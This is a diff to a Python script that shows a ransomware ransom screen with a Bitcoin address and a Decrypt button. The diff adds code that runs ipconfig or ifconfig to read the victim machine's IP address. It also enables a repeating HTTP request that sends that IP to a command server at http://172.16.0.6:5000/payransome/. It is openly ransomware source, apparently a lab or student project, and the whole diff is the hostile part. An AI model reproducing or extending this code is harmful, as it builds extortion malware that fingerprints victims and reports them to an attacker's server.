@@ -1,6 +1,7 @@
 import PySimpleGUI as sg
 import requests
-
+import platform
+import subprocess, re
 sg.theme('Black')   # Add a touch of color
 # All the stuff inside your window.
 layout = [  [sg.Text('Oops, looks like your files have been corrupted \nWhat happened to my computer?', font = '20' , text_color = 'white', background_color='maroon' )],
@@ -12,12 +13,26 @@ layout = [  [sg.Text('Oops, looks like your files have been corrupted \nWhat hap
             [sg.Text('Bitcoin Address: 151amaAjamfafa2665aaJoafaFjpajfnaifaJFNajf ', font='14', text_color='white', background_color='maroon')],
             [sg.Button('Decrypt')] ]
 
+if(platform.system() == 'Windows'):
+        cmd = "ipconfig"
+        cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        temp = re.findall('IPv4 Address.+: (.+)',cmd.stdout.read().decode())
+        temp = temp[len(temp)-1].rstrip()
+        ip = temp
+elif(platform.system() == 'Linux'):
+        cmd = 'ifconfig'
+        cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        temp =  re.findall('inet \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}',cmd.stdout.read().decode())
+        temp = temp[0].split(" ")
+        temp = temp[1].rstrip()
+        ip = temp
 # Create the Window
+print(ip)
 window = sg.Window('Kamehameha', layout)
 # Event Loop to process "events" and get the "values" of the inputs
 while True:
     event, values = window.read(timeout=100)
     if event == sg.WINDOW_CLOSED:
         break
-    #requests.get("http://172.16.0.6:5000/payransome/")
+    requests.get("http://172.16.0.6:5000/payransome/"+ip)
 window.close()
